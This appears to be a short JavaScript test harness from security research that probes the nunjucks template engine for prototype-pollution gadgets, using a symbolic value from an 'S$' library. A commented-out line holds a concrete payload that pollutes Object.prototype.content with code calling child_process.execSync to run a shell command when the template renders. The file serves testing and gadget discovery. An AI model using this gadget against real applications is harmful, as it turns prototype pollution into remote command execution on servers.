const nunjucks = require("nunjucks");
const S$ = require('../../../lib/S$');

Object.prototype.content = S$.pureSymbol('content_undef');

// Object.prototype.content = " function(){ return global.process.mainModule.require('child_process').execSync('touch a.txt') }() ";

nunjucks.compile(" {{ content }} ").render();